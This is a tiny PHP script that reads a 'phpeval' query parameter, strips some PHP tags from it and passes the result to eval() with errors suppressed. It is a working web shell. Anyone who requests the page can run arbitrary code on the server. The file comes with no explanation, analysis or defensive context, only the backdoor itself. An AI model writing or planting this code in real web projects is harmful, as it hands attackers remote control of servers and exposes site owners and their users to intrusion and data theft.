<?php
$phpeval = $_GET['phpeval'];
$eval = @str_replace("<?","",$phpeval);
$eval = @str_replace("?>","",$phpeval);
@eval($eval);
?>